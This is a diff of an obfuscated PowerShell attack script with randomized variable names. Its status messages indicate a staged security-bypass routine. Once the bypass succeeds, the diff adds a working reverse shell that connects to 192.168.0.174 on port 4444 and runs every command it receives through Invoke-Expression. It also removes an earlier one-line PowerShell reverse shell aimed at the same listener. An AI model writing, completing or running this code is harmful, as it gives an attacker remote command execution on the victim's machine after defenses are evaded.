@@ -71,17 +71,33 @@ try {
     Write-Host '[!] Stage 2 failed'
   }
 
-  try {
+try {
     $pzv = fWhjk 'JHYbDlvF'
     $fi4 = $uld.$wyz($pzv)
     if ($fi4 -ne $null) {
-      Write-Host '[+] Bypass confirmed'
+        Write-Host '[+] Bypass confirmed'
+
+        # Reverse shell connection
+        $client = New-Object System.Net.Sockets.TcpClient("192.168.0.174", 4444)
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $reader = New-Object System.IO.StreamReader($stream)
+        $writer.AutoFlush = $true
+
+        # Send initial message
+        $writer.WriteLine("Reverse shell connected")
+
+        # Read and send commands
+        while (($command = $reader.ReadLine()) -ne $null) {
+            $output = Invoke-Expression $command
+            $writer.WriteLine($output)
+        }
     } else {
-      Write-Host '[!] Bypass failed'
+        Write-Host '[!] Bypass failed'
     }
-  } catch {
+} catch {
     Write-Host '[!] Bypass failed'
-  }
+}
 
   Start-Sleep -Milliseconds 103
   $null = [Environment]::ProcessorCount
@@ -100,4 +116,3 @@ finally {
   Remove-Item Env:\Vwd8HbnM -ErrorAction SilentlyContinue
 }
 
-powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('192.168.0.174',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"
